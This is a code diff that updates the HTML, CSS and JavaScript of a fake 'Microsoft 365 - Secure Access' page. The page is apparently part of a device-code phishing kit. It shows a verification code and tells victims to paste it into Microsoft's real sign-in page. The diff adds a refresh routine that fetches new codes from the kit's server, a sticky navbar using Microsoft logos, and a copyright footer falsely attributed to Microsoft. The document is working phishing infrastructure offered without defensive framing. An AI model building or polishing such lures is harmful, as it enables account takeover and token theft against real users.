@@ -32,106 +32,612 @@ const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <meta name="referrer" content="no-referrer">
 <title>Microsoft 365 - Secure Access</title>
-<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
+<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;width:100%}
-body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f4f8;display:flex;flex-direction:column;min-height:100vh}
-.header{background:#0078d4;padding:12px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0}
-.header svg{flex-shrink:0}
-.header-title{color:#fff;font-size:18px;font-weight:600}
-.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
-.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,0.08);width:100%;max-width:440px;padding:40px 48px}
-.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
-.logo svg{flex-shrink:0}
-.logo-text{font-size:20px;font-weight:600;color:#1a1a1a}
-.intro{text-align:center;color:#323130;font-size:15px;line-height:1.6;margin-bottom:24px}
-.info-box{background:#deecf9;border-left:4px solid #0078d4;padding:14px 16px;margin-bottom:24px;font-size:14px;color:#004578;line-height:1.5}
-.code-label{font-size:13px;font-weight:600;color:#323130;margin-bottom:8px}
-.code-input{width:100%;background:#f3f2f1;border:1px solid #8a8886;border-radius:2px;padding:12px 16px;font-size:24px;font-weight:700;letter-spacing:4px;color:#0078d4;text-align:center;font-family:'Segoe UI Mono',Consolas,monospace;margin-bottom:8px;user-select:all}
-.code-input.loading{color:#8a8886;font-size:16px;letter-spacing:normal}
-.copy-row{display:flex;justify-content:center;margin-bottom:20px}
-.copy-btn{background:#0078d4;color:#fff;border:none;padding:8px 20px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px;transition:background 0.15s}
-.copy-btn:hover{background:#106ebe}
-.copy-btn.copied{background:#107c10}
-.copy-btn svg{width:16px;height:16px;fill:currentColor}
-.status{font-size:13px;color:#107c10;text-align:center;margin-bottom:16px;min-height:20px;font-weight:500}
-.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px;transition:background 0.15s;margin-bottom:20px}
-.btn-primary:hover{background:#106ebe}
-.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}
-.btn-primary svg{flex-shrink:0}
-.security-box{background:#f3f2f1;border-left:4px solid #0078d4;padding:16px;margin-bottom:20px;text-align:center}
-.security-box p{font-size:13px;color:#605e5c;line-height:1.5;margin-bottom:12px}
-.security-badge{display:inline-flex;align-items:center;gap:6px;background:#0078d4;color:#fff;padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600}
-.security-badge svg{width:14px;height:14px;fill:currentColor}
-.footer-text{text-align:center;font-size:12px;color:#605e5c;margin-bottom:16px}
-.timer{text-align:center;font-size:12px;color:#8a8886}
-.timer span{font-weight:600;color:#323130}
-.success{display:none;text-align:center;padding:20px 0}
-.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
-.success-icon svg{width:32px;height:32px;fill:#fff}
-.success h2{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
-.success p{font-size:14px;color:#605e5c;margin-bottom:20px}
-.success-badge{display:inline-flex;align-items:center;gap:8px;background:#dff6dd;color:#107c10;padding:10px 20px;border-radius:2px;font-size:14px;font-weight:600}
-.success-badge svg{width:18px;height:18px;fill:currentColor}
-@media(max-width:500px){.card{padding:32px 24px;border-radius:0}.code-input{font-size:20px;letter-spacing:2px}}
+body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f8f9fc;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden}
+
+/* Microsoft Modern Design System */
+:root {
+  --ms-blue: #0078d4;
+  --ms-blue-hover: #106ebe;
+  --ms-blue-light: #deecf9;
+  --ms-green: #107c10;
+  --ms-green-light: #dff6dd;
+  --ms-gray-900: #201f1e;
+  --ms-gray-800: #323130;
+  --ms-gray-600: #605e5c;
+  --ms-gray-400: #8a8886;
+  --ms-gray-200: #edebe9;
+  --ms-gray-100: #f3f2f1;
+  --ms-white: #ffffff;
+  --ms-shadow-sm: 0 0.5px 1px rgba(0,0,0,0.05), 0 2px 4px rgba(0,0,0,0.06);
+  --ms-shadow-md: 0 2px 8px rgba(0,0,0,0.08);
+  --ms-shadow-lg: 0 8px 32px rgba(0,0,0,0.12);
+  --ms-radius: 8px;
+  --ms-transition: all 0.2s cubic-bezier(0.1, 0.9, 0.2, 1);
+}
+
+/* Modern Navbar */
+.navbar {
+  background: var(--ms-white);
+  border-bottom: 1px solid var(--ms-gray-200);
+  padding: 12px clamp(16px, 4vw, 32px);
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(8px);
+  background: rgba(255,255,255,0.92);
+}
+.navbar-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.navbar-logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  text-decoration: none;
+}
+.navbar-logo img {
+  height: 24px;
+  width: auto;
+}
+.navbar-logo span {
+  font-size: clamp(16px, 2vw, 18px);
+  font-weight: 600;
+  color: var(--ms-gray-900);
+  letter-spacing: -0.2px;
+}
+
+/* Main Container */
+.main {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: clamp(20px, 5vh, 40px) clamp(16px, 3vw, 20px);
+  background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 100%);
+  min-height: calc(100vh - 64px);
+}
+
+/* Modern Card */
+.card {
+  background: var(--ms-white);
+  border-radius: var(--ms-radius);
+  box-shadow: var(--ms-shadow-lg);
+  width: 100%;
+  max-width: min(480px, 95vw);
+  padding: clamp(28px, 5vw, 48px) clamp(20px, 4vw, 52px);
+  border: 1px solid rgba(255,255,255,0.8);
+  transition: var(--ms-transition);
+}
+.card:hover {
+  box-shadow: 0 12px 48px rgba(0,0,0,0.15);
+}
+
+/* Logo Section */
+.logo {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: clamp(20px, 4vh, 32px);
+}
+.logo img {
+  height: clamp(28px, 4vw, 36px);
+  width: auto;
+}
+.logo-text {
+  font-size: clamp(20px, 3vw, 24px);
+  font-weight: 600;
+  color: var(--ms-gray-900);
+  letter-spacing: -0.4px;
+}
+
+/* Typography */
+.intro {
+  text-align: center;
+  color: var(--ms-gray-800);
+  font-size: clamp(14px, 1.6vw, 16px);
+  line-height: 1.6;
+  margin-bottom: clamp(16px, 2vh, 24px);
+  font-weight: 400;
+}
+
+/* Info Box */
+.info-box {
+  background: var(--ms-blue-light);
+  border-left: 4px solid var(--ms-blue);
+  padding: clamp(12px, 2vh, 16px) clamp(14px, 2vw, 20px);
+  margin-bottom: clamp(16px, 2vh, 28px);
+  font-size: clamp(13px, 1.2vw, 14px);
+  color: #004578;
+  line-height: 1.5;
+  border-radius: 0 var(--ms-radius) var(--ms-radius) 0;
+}
+
+/* Code Section */
+.code-label {
+  font-size: clamp(13px, 1.2vw, 14px);
+  font-weight: 600;
+  color: var(--ms-gray-800);
+  margin-bottom: 8px;
+}
+.code-container {
+  background: var(--ms-gray-100);
+  border-radius: var(--ms-radius);
+  padding: clamp(14px, 2vh, 20px) clamp(16px, 2.5vw, 24px);
+  margin-bottom: 16px;
+  border: 2px solid transparent;
+  transition: var(--ms-transition);
+}
+.code-container:focus-within {
+  border-color: var(--ms-blue);
+  background: var(--ms-white);
+  box-shadow: 0 0 0 4px rgba(0,120,212,0.1);
+}
+.code-display {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+.code-input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  padding: 8px 0;
+  font-size: clamp(22px, 4vw, 28px);
+  font-weight: 700;
+  letter-spacing: clamp(4px, 0.8vw, 6px);
+  color: var(--ms-blue);
+  text-align: center;
+  font-family: 'Segoe UI Mono', 'Cascadia Code', Consolas, monospace;
+  min-height: 48px;
+  user-select: all;
+  outline: none;
+  min-width: 120px;
+}
+.code-input.loading {
+  color: var(--ms-gray-400);
+  font-size: clamp(14px, 1.5vw, 16px);
+  letter-spacing: normal;
+  font-weight: 400;
+}
+.copy-btn {
+  flex-shrink: 0;
+  background: transparent;
+  color: var(--ms-blue);
+  border: none;
+  padding: 8px;
+  cursor: pointer;
+  transition: var(--ms-transition);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 40px;
+  height: 40px;
+  min-width: 40px;
+  border-radius: 6px;
+}
+.copy-btn:hover:not(:disabled) {
+  background: var(--ms-blue-light);
+  transform: scale(1.05);
+}
+.copy-btn:active:not(:disabled) {
+  transform: scale(0.95);
+}
+.copy-btn.copied {
+  color: var(--ms-green);
+}
+.copy-btn:disabled {
+  color: var(--ms-gray-400);
+  cursor: not-allowed;
+  transform: none;
+}
+.copy-btn svg {
+  width: 22px;
+  height: 22px;
+  fill: currentColor;
+  transition: var(--ms-transition);
+}
+.copy-btn .copy-icon { display: block; }
+.copy-btn .check-icon { display: none; }
+.copy-btn.copied .copy-icon { display: none; }
+.copy-btn.copied .check-icon { display: block; }
+
+/* Status */
+.status {
+  font-size: clamp(12px, 1.2vw, 13px);
+  color: var(--ms-green);
+  text-align: center;
+  margin: 8px 0;
+  min-height: 20px;
+  font-weight: 500;
+}
+.status.error {
+  color: #d83b01;
+}
+
+/* Primary Button */
+.btn-primary {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  width: 100%;
+  background: var(--ms-blue);
+  color: var(--ms-white);
+  border: none;
+  padding: clamp(12px, 2vh, 14px) 24px;
+  font-size: clamp(14px, 1.4vw, 16px);
+  font-weight: 600;
+  cursor: pointer;
+  border-radius: var(--ms-radius);
+  transition: var(--ms-transition);
+  margin-bottom: 20px;
+  min-height: 52px;
+}
+.btn-primary:hover:not(:disabled) {
+  background: var(--ms-blue-hover);
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(0,120,212,0.3);
+}
+.btn-primary:active:not(:disabled) {
+  transform: translateY(0);
+}
+.btn-primary:disabled {
+  background: var(--ms-gray-400);
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+.btn-primary svg {
+  flex-shrink: 0;
+  width: 20px;
+  height: 20px;
+}
+
+/* Footer & Timer */
+.footer-text {
+  text-align: center;
+  font-size: clamp(12px, 1.2vw, 13px);
+  color: var(--ms-gray-600);
+  margin-bottom: clamp(12px, 2vh, 16px);
+}
+.timer-section {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: clamp(8px, 1.5vw, 12px);
+  font-size: clamp(12px, 1.2vw, 13px);
+  color: var(--ms-gray-600);
+  flex-wrap: wrap;
+}
+.timer-section span {
+  font-weight: 600;
+  color: var(--ms-gray-800);
+}
+.refresh-btn {
+  background: none;
+  border: none;
+  color: var(--ms-blue);
+  font-weight: 600;
+  cursor: pointer;
+  font-size: clamp(12px, 1.2vw, 13px);
+  padding: 4px 12px;
+  border-radius: 4px;
+  transition: var(--ms-transition);
+  white-space: nowrap;
+}
+.refresh-btn:hover:not(:disabled) {
+  background: var(--ms-blue-light);
+}
+.refresh-btn:disabled {
+  color: var(--ms-gray-400);
+  cursor: not-allowed;
+}
+
+/* Success View */
+.success {
+  display: none;
+  text-align: center;
+  padding: 20px 0;
+}
+.success-icon {
+  width: clamp(60px, 10vw, 72px);
+  height: clamp(60px, 10vw, 72px);
+  background: var(--ms-green);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 24px;
+  box-shadow: 0 8px 24px rgba(16,124,16,0.2);
+}
+.success-icon svg {
+  width: clamp(30px, 5vw, 36px);
+  height: clamp(30px, 5vw, 36px);
+  fill: var(--ms-white);
+}
+.success h2 {
+  font-size: clamp(20px, 2.5vw, 22px);
+  font-weight: 600;
+  color: var(--ms-gray-900);
+  margin-bottom: 8px;
+}
+.success p {
+  font-size: clamp(14px, 1.4vw, 15px);
+  color: var(--ms-gray-600);
+  margin-bottom: 24px;
+}
+.success-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: var(--ms-green-light);
+  color: var(--ms-green);
+  padding: clamp(10px, 1.5vh, 12px) clamp(16px, 3vw, 24px);
+  border-radius: var(--ms-radius);
+  font-size: clamp(13px, 1.3vw, 14px);
+  font-weight: 600;
+}
+.success-badge svg {
+  width: 18px;
+  height: 18px;
+  fill: currentColor;
+}
+
+/* Instruction Box */
+.instruction-box {
+  background: #f0f6ff;
+  border-radius: var(--ms-radius);
+  padding: clamp(12px, 2vh, 16px) clamp(14px, 2vw, 20px);
+  margin: 16px 0 12px 0;
+  border: 1px solid #d0e3f5;
+}
+.instruction-box h4 {
+  font-size: clamp(12px, 1.2vw, 13px);
+  font-weight: 600;
+  color: var(--ms-gray-800);
+  margin-bottom: 8px;
+}
+.instruction-box ol {
+  font-size: clamp(12px, 1.2vw, 13px);
+  color: var(--ms-gray-600);
+  line-height: 1.6;
+  padding-left: 20px;
+  margin: 0;
+}
+.instruction-box ol li {
+  margin-bottom: 4px;
+}
+.instruction-box ol li:last-child {
+  margin-bottom: 0;
+}
+
+/* Copyright Footer */
+.copyright {
+  text-align: center;
+  padding: 16px clamp(16px, 3vw, 32px);
+  font-size: clamp(11px, 1vw, 12px);
+  color: var(--ms-gray-600);
+  border-top: 1px solid var(--ms-gray-200);
+  background: var(--ms-white);
+  flex-shrink: 0;
+}
+.copyright a {
+  color: var(--ms-blue);
+  text-decoration: none;
+}
+.copyright a:hover {
+  text-decoration: underline;
+}
+
+/* Responsive Breakpoints */
+@media (max-width: 520px) {
+  .navbar {
+    padding: 8px 12px;
+  }
+  .navbar-logo span {
+    font-size: 14px;
+  }
+  .card {
+    padding: 20px 16px;
+    border-radius: 0;
+    box-shadow: none;
+    max-width: 100%;
+  }
+  .code-input {
+    font-size: 18px;
+    letter-spacing: 3px;
+    min-height: 40px;
+  }
+  .code-display {
+    flex-direction: column;
+    gap: 10px;
+    align-items: stretch;
+  }
+  .copy-btn {
+    width: 100%;
+    height: 48px;
+    min-width: unset;
+    background: var(--ms-blue-light);
+    border-radius: 6px;
+  }
+  .copy-btn:hover:not(:disabled) {
+    background: var(--ms-blue);
+    color: white;
+  }
+  .copy-btn.copied {
+    background: var(--ms-green-light);
+    color: var(--ms-green);
+  }
+  .logo-text {
+    font-size: 18px;
+  }
+  .logo img {
+    height: 28px;
+  }
+  .btn-primary {
+    min-height: 48px;
+    font-size: 14px;
+  }
+  .timer-section {
+    flex-direction: column;
+    gap: 6px;
+  }
+}
+
+@media (max-width: 380px) {
+  .navbar-logo span {
+    font-size: 12px;
+  }
+  .code-input {
+    font-size: 16px;
+    letter-spacing: 2px;
+    min-height: 36px;
+  }
+  .card {
+    padding: 16px 12px;
+  }
+  .instruction-box ol {
+    padding-left: 16px;
+    font-size: 11px;
+  }
+}
+
+@media (min-width: 521px) and (max-width: 768px) {
+  .card {
+    padding: 32px 28px;
+  }
+  .code-input {
+    font-size: 24px;
+  }
+}
+
+@media (max-height: 600px) and (orientation: landscape) {
+  .main {
+    padding: 16px;
+  }
+  .card {
+    padding: 20px 24px;
+    max-width: 480px;
+  }
+  .logo {
+    margin-bottom: 16px;
+  }
+  .intro {
+    margin-bottom: 12px;
+    font-size: 14px;
+  }
+  .info-box {
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    font-size: 12px;
+  }
+  .code-container {
+    padding: 12px 16px;
+  }
+  .code-input {
+    min-height: 36px;
+    font-size: 20px;
+  }
+  .btn-primary {
+    min-height: 40px;
+    padding: 10px 20px;
+    margin-bottom: 12px;
+  }
+}
 </style>
 </head>
 <body>
-<div class="header">
-<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
-<span class="header-title">Microsoft 365</span>
-</div>
+
+<!-- Modern Navbar -->
+<nav class="navbar">
+  <div class="navbar-left">
+    <a href="#" class="navbar-logo">
+      <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft/default.svg" alt="Microsoft" onerror="this.style.display='none'">
+      <span>Microsoft</span>
+    </a>
+  </div>
+</nav>
 
 <div class="main">
-<div class="card">
-<div class="logo">
-<svg width="28" height="28" viewBox="0 0 24 24"><rect width="11" height="11" fill="#f25022"/><rect x="13" width="11" height="11" fill="#7fba00"/><rect y="13" width="11" height="11" fill="#00a4ef"/><rect x="13" y="13" width="11" height="11" fill="#ffb900"/></svg>
-<span class="logo-text">Microsoft 365</span>
+  <div class="card">
+    <!-- Logo -->
+    <div class="logo">
+      <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft-365-copilot/default.svg" alt="Microsoft 365" onerror="this.style.display='none'">
+      <span class="logo-text">Microsoft 365</span>
+    </div>
+
+    <div id="mainView">
+      <p class="intro">Please verify your device to access your Microsoft 365 account.</p>
+
+      <div class="info-box">
+        🔒 For security reasons, Microsoft requires verification before granting access to account activity reports.
+      </div>
+
+      <!-- Code Section -->
+      <div class="code-label">Verification Code</div>
+      <div class="code-container">
+        <div class="code-display">
+          <div class="code-input" id="userCode">Loading...</div>
+          <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
+            <svg class="copy-icon" viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
+            <svg class="check-icon" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="status" id="codeStatus"></div>
+
+      <!-- Instructions -->
+      <div class="instruction-box">
+        <h4>📋 How to sign in:</h4>
+        <ol>
+          <li>Copy the verification code above</li>
+          <li>Click the <strong>"Sign In to Microsoft"</strong> button below</li>
+          <li>Paste the code when prompted on the verification page</li>
+          <li>Complete verification to access your account</li>
+        </ol>
+      </div>
+
+      <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
+        <svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
+        Sign In to Microsoft
+      </button>
+
+      <p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>
+
+      <div class="timer-section">
+        <span>⏱️ Code expires in <span id="timerValue">{expires_minutes}</span></span>
+        <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()">↻ Refresh Code</button>
+      </div>
+    </div>
+
+    <div class="success" id="successView">
+      <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+      <h2>Verification Complete</h2>
+      <p>Your identity has been confirmed. You may now close this window.</p>
+      <div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Account Verified</div>
+    </div>
+  </div>
 </div>
 
-<div id="mainView">
-<p class="intro">Please verify your identity to securely access your Microsoft 365 account.</p>
-
-<div class="info-box">For security reasons, Microsoft requires verification before granting access to your account resources.</div>
-
-<div class="code-label">Verification Code</div>
-<div class="code-input" id="userCode">Loading...</div>
-
-<div class="copy-row">
-<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
-<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-<span id="copyText">Copy Code</span>
-</button>
-</div>
-
-<div class="status" id="codeStatus"></div>
-
-<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
-Sign In to Microsoft
-</button>
-
-<div class="security-box">
-<p>Your account is protected by Microsoft's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
-<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
-<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-Microsoft Secure Platform
-</a>
-</div>
-
-<p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>
-
-<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-</div>
-
-<div class="success" id="successView">
-<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-<h2>Verification Complete</h2>
-<p>Your identity has been confirmed. You may now close this window.</p>
-<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Account Verified</div>
-</div>
-</div>
+<!-- Copyright Footer -->
+<div class="copyright">
+  &copy; 2026 Microsoft Corporation. All rights reserved. | 
+  <a href="#">Privacy</a> &bull; 
+  <a href="#">Terms</a> &bull; 
+  <a href="#">Support</a>
 </div>
 
 <script>
@@ -146,8 +652,8 @@ var codeEl=document.getElementById('userCode');
 var statusEl=document.getElementById('codeStatus');
 var btnEl=document.getElementById('signInBtn');
 var copyBtnEl=document.getElementById('copyBtn');
-var copyTextEl=document.getElementById('copyText');
 var timerEl=document.getElementById('timerValue');
+var refreshBtn=document.getElementById('refreshBtn');
 
 function showCode(c,v){
 code=c;
@@ -156,7 +662,7 @@ codeEl.textContent=c;
 codeEl.classList.remove('loading');
 btnEl.disabled=false;
 copyBtnEl.disabled=false;
-document.getElementById('verifyLink').href=verifyUrl;
+refreshBtn.disabled=false;
 }
 
 if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}
@@ -168,16 +674,19 @@ else{var t=document.createElement('textarea');t.value=code;t.style.cssText='posi
 }
 function showCopied(){
 copyBtnEl.classList.add('copied');
-copyTextEl.textContent='Copied!';
-statusEl.textContent='Code copied to clipboard';
-setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);
+statusEl.textContent='✅ Code copied to clipboard';
+statusEl.className='status';
+setTimeout(function(){
+copyBtnEl.classList.remove('copied');
+statusEl.textContent='';
+},5000);
 }
 window.copyCode=copyCode;
 
 function openSignIn(){
 if(!code)return;
 copyCode();
-var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
+var w=560,h=720,l=(screen.width-w)/2,t=(screen.height-h)/2;
 popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
 if(popup)popup.focus();
 }
@@ -190,8 +699,42 @@ var m=Math.floor(expiresIn/60);
 var s=expiresIn%60;
 timerEl.textContent=m+':'+(s<10?'0':'')+s;
 if(expiresIn>0)setTimeout(updateTimer,1000);
+else {
+  timerEl.textContent='Expired';
+  refreshBtn.style.color='#d83b01';
+}
 }
 if(codeReady)setTimeout(updateTimer,1000);
+
+function refreshCode(){
+refreshBtn.disabled=true;
+statusEl.textContent='🔄 Refreshing code...';
+statusEl.className='status';
+fetch('/dc/refresh/'+sid,{method:'POST',credentials:'include'}).then(function(r){return r.json()}).then(function(d){
+if(d.user_code){
+codeReady=true;
+code=d.user_code;
+verifyUrl=d.verify_url;
+expiresIn=d.expires_seconds||300;
+showCode(code,verifyUrl);
+statusEl.textContent='✅ New code generated';
+statusEl.className='status';
+timerEl.textContent=Math.floor(expiresIn/60)+':00';
+refreshBtn.disabled=false;
+setTimeout(function(){statusEl.textContent='';},3000);
+if(expiresIn>0)setTimeout(updateTimer,1000);
+} else {
+statusEl.textContent='❌ Failed to refresh. Please try again.';
+statusEl.className='status error';
+refreshBtn.disabled=false;
+}
+}).catch(function(){
+statusEl.textContent='❌ Network error. Please try again.';
+statusEl.className='status error';
+refreshBtn.disabled=false;
+});
+}
